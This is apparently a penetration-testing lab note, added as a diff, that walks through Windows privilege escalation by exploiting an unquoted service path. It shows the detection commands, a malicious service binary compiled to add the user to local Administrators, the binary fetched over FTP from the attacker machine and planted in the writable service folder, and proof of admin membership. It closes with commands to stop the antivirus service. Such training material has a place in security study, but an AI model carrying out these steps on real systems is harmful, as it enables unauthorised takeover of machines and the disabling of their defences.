@@ -1,0 +1,184 @@
+Detection - Windows VM (target)
+--------------------------------
+
+1. Open command prompt and type: 
+
+	C:\Temp> sc qc unquosvc   
+	sc qc unquosvc
+	[SC] QueryServiceConfig SUCCESS
+
+	SERVICE_NAME: unquosvc
+		TYPE               : 10  WIN32_OWN_PROCESS 
+		START_TYPE         : 3   DEMAND_START
+		ERROR_CONTROL      : 1   NORMAL
+		BINARY_PATH_NAME   : C:\Program Files\TH Application Service\Common Files\thservice.exe
+		LOAD_ORDER_GROUP   : 
+		TAG                : 0
+		DISPLAY_NAME       : TH Application Service
+		DEPENDENCIES       : 
+		SERVICE_START_NAME : LocalSystem
+		
+		
+2. Notice that the “BINARY_PATH_NAME” field displays a path that is not confined between quotes.
+
+3. Check permissions that we have for the folder "C:\Program Files\TH Application Service"
+
+	C:\Temp\accesschk> cacls "C:\Program Files\TH Application Service"
+	
+	C:\Program Files\TH Application Service BUILTIN\Users:F 
+		                                NT SERVICE\TrustedInstaller:(ID)F 
+		                                NT SERVICE\TrustedInstaller:(CI)(IO)(ID)F 
+		                                NT AUTHORITY\SYSTEM:(ID)F 
+		                                NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(ID)F 
+		                                BUILTIN\Administrators:(ID)F 
+		                                BUILTIN\Administrators:(OI)(CI)(IO)(ID)F 
+		                                BUILTIN\Users:(ID)R 
+		                                BUILTIN\Users:(OI)(CI)(IO)(ID)(special access:)
+
+		                                                              GENERIC_READ
+		                                                              GENERIC_EXECUTE
+	 
+		                                CREATOR OWNER:(OI)(CI)(IO)(ID)F 
+		                                APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(ID)R 
+		                                APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(ID)(special access:)
+
+		                                                                                                       GENERIC_READ
+		                                                                                                       GENERIC_EXECUTE
+
+Exploitation - Windows VM (target)
+-----------------------------------
+
+1. Create a malicious service file named 'program.exe' and place it in ‘C:\Temp\’.
+
+	sudo apt-get install mingw-w64
+	x86_64-w64-mingw32-gcc windows_service.c -o program.exe		// system("cmd.exe /k whoami > c:\\windows\\temp\\pwned-fiston.txt");
+	x86_64-w64-mingw32-gcc windows_service.c -o program2.exe	// system("cmd.exe /k net localgroup administrators user /add");
+	
+	
+	jeff@kali-Linux:~/Documents/Windows-training/Tools/Source$ sudo apt-get install -y python-pyftpdlib
+	jeff@kali-Linux:~/Documents/Windows-training/Tools/Source$ sudo python3 -m pyftpdlib -p 21
+	[I 2020-03-25 23:00:52] >>> starting FTP server on 0.0.0.0:21, pid=4376 <<<
+	[I 2020-03-25 23:00:52] concurrency model: async
+	[I 2020-03-25 23:00:52] masquerade (NAT) address: None
+	[I 2020-03-25 23:00:52] passive ports: None
+	[I 2020-03-25 23:01:32] 192.168.1.50:49200-[] FTP session opened (connect)
+	[I 2020-03-25 23:01:39] 192.168.1.50:49200-[anonymous] USER 'anonymous' logged in.
+	[I 2020-03-25 23:01:51] 192.168.1.50:49200-[anonymous] RETR /home/jeff/Documents/Windows-training/Tools/Source/program.exe completed=1 bytes=320826 seconds=0.089
+	[I 2020-03-25 23:02:01] 192.168.1.50:49200-[anonymous] RETR /home/jeff/Documents/Windows-training/Tools/Source/program2.exe completed=1 bytes=320826 seconds=0.061
+	[I 2020-03-25 23:02:13] 192.168.1.50:49200-[anonymous] FTP session closed (disconnect).
+
+	
+	PS C:\Temp> ftp 192.168.1.34
+	Connected to 192.168.1.34.
+	220 pyftpdlib 1.5.4 ready.
+	User (192.168.1.34:(none)): anonymous
+	331 Username ok, send password.
+	Password: anonymous
+	230 Login successful.
+	ftp> binary
+	200 Type set to: Binary.
+	ftp> get program.exe
+	200 Active data connection established.
+	125 Data connection already open. Transfer starting.
+	226 Transfer complete.
+	ftp: 320826 bytes received in 0.13Seconds 2566.61Kbytes/sec.
+	ftp> get program2.exe
+	200 Active data connection established.
+	125 Data connection already open. Transfer starting.
+	226 Transfer complete.
+	ftp: 320826 bytes received in 0.08Seconds 4113.15Kbytes/sec.
+	ftp> quit
+	221 Goodbye.
+
+2. Then copy and rename 'program.exe' to 'common.exe' it in ‘C:\Program Files\Unquoted Path Service’.
+	
+	C:\Temp> copy C:\Temp\program2.exe "C:\Program Files\TH Application Service\Common.exe"
+	copy C:\Temp\program2.exe "C:\Program Files\TH Application Service\Common.exe"
+		1 file(s) copied.
+		
+	C:\Temp> net user user
+	net user user
+	User name                    user
+	Full Name                    
+	Comment                      
+	User's comment               
+	Country/region code          000 (System Default)
+	Account active               Yes
+	Account expires              Never
+
+	Password last set            3/12/2020 3:52:30 AM
+	Password expires             4/23/2020 3:52:30 AM
+	Password changeable          3/12/2020 3:52:30 AM
+	Password required            Yes
+	User may change password     Yes
+
+	Workstations allowed         All
+	Logon script                 
+	User profile                 
+	Home directory               
+	Last logon                   3/26/2020 12:36:08 AM
+
+	Logon hours allowed          All
+
+	Local Group Memberships      *Remote Desktop Users *Users                
+	Global Group memberships     *None                 
+	The command completed successfully.
+
+
+3. Start the service 'unquosvc' 
+
+	C:\Temp> sc start unquosvc
+	sc start unquosvc
+
+	SERVICE_NAME: unquosvc 
+		TYPE               : 10  WIN32_OWN_PROCESS  
+		STATE              : 2  START_PENDING 
+		                        (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+		WIN32_EXIT_CODE    : 0  (0x0)
+		SERVICE_EXIT_CODE  : 0  (0x0)
+		CHECKPOINT         : 0x0
+		WAIT_HINT          : 0x7d0
+		PID                : 3876
+		FLAGS              : 
+
+	=> We are now member of the local admin group		
+		
+	C:\Temp> net user user
+	net user user
+	User name                    user
+	Full Name                    
+	Comment                      
+	User's comment               
+	Country/region code          000 (System Default)
+	Account active               Yes
+	Account expires              Never
+
+	Password last set            3/12/2020 3:52:30 AM
+	Password expires             4/23/2020 3:52:30 AM
+	Password changeable          3/12/2020 3:52:30 AM
+	Password required            Yes
+	User may change password     Yes
+
+	Workstations allowed         All
+	Logon script                 
+	User profile                 
+	Home directory               
+	Last logon                   3/26/2020 12:36:08 AM
+
+	Logon hours allowed          All
+
+	Local Group Memberships      *Administrators       *Remote Desktop Users 
+		                     *Users                
+	Global Group memberships     *None                 
+	The command completed successfully.
+
+
+
+
+Other: command to stop the MSE antivirus once we are local admin
+-----------------------------------------------------------------
+sc stop MSMPSvc
+taskkill /f /im msseces.exe
+
+del "C:\Program Files\TH Application Service\Common.exe"
+
